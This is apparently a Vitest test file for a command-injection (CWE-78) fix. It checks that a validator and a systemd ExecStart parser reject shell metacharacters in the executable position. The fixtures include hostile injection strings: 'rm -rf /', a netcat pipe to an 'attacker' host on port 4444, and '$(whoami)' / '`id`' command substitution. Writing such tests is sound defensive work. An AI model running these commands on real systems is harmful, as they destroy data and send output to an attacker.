import { describe, expect, it } from "vitest";
import { assertSafeArgv, splitArgsPreservingQuotes } from "./arg-split.js";
import { parseSystemdExecStart } from "./systemd-unit.js";

describe("CWE-78: split-args misused as security boundary", () => {
  describe("assertSafeArgv", () => {
    it("should reject command with shell metacharacters", () => {
      expect(() => assertSafeArgv(["; rm -rf /", "--flag"])).toThrow(/not a safe executable/);
      expect(() => assertSafeArgv(["cmd | nc attacker 4444"])).toThrow(/not a safe executable/);
      expect(() => assertSafeArgv(["$(whoami)"])).toThrow(/not a safe executable/);
      expect(() => assertSafeArgv(["`id`"])).toThrow(/not a safe executable/);
    });

    it("should reject command starting with -", () => {
      expect(() => assertSafeArgv(["--malicious-flag"])).toThrow(/not a safe executable/);
    });

    it("should accept valid bare command", () => {
      expect(() => assertSafeArgv(["openclaw", "gateway", "start"])).not.toThrow();
      expect(() => assertSafeArgv(["signal-cli", "-a", "123"])).not.toThrow();
    });

    it("should accept valid path command", () => {
      expect(() => assertSafeArgv(["/usr/local/bin/openclaw", "start"])).not.toThrow();
      expect(() => assertSafeArgv(["C:\\Program Files\\openclaw\\openclaw.exe"])).not.toThrow();
    });

    it("should accept empty argv", () => {
      expect(() => assertSafeArgv([])).not.toThrow();
    });

    it("should not validate non-command arguments", () => {
      // Only the first element (command) is validated; args can contain anything
      expect(() => assertSafeArgv(["openclaw", "--name", "safe&value"])).not.toThrow();
      expect(() => assertSafeArgv(["openclaw", "arg with | pipe"])).not.toThrow();
    });
  });

  describe("parseSystemdExecStart validates command", () => {
    it("should reject malicious ExecStart command", () => {
      expect(() => parseSystemdExecStart("; rm -rf / --flag")).toThrow(/not a safe executable/);
      expect(() => parseSystemdExecStart("$(whoami) --arg")).toThrow(/not a safe executable/);
    });

    it("should accept valid ExecStart", () => {
      expect(
        parseSystemdExecStart('/usr/local/bin/openclaw gateway start --name "My Bot"'),
      ).toEqual(["/usr/local/bin/openclaw", "gateway", "start", "--name", "My Bot"]);
    });
  });

  describe("splitArgsPreservingQuotes remains a pure parser", () => {
    it("should parse without validation (callers must validate)", () => {
      const result = splitArgsPreservingQuotes("; rm -rf / --flag");
      expect(result).toEqual([";", "rm", "-rf", "/", "--flag"]);
    });
  });
});
